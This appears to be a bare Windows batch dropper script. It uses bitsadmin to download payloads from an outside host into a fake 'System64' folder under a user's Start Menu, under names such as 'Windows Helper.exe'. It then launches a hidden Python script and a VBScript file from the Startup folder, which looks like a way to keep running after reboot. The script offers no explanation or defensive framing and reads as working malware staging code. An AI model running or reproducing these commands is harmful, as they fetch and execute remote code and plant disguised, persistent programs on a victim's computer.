bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://api-hw.com/dl/runtime" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\runtime.zip"
start "" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\sh.pyw"
bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://api-hw.com/dl/w" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\Windows Helper.exe"
start "" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WIN64.vbs"